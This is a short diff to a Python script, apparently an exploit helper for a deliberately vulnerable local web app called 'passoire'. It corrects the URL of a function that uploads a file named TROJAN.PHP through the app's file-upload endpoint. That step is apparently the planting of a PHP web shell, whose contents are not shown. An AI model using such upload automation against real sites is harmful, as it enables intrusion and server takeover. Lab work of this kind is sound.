@@ -31,7 +31,7 @@ def passoire_register():
         
 def passoire_upload():
     r = requests.post(
-        "http://localhost:1080/passoire/file_uploads.php",
+        "http://localhost:1080/passoire/file_upload.php",
         {
             "file" : open("TROJAN.PHP", "rb")
         }
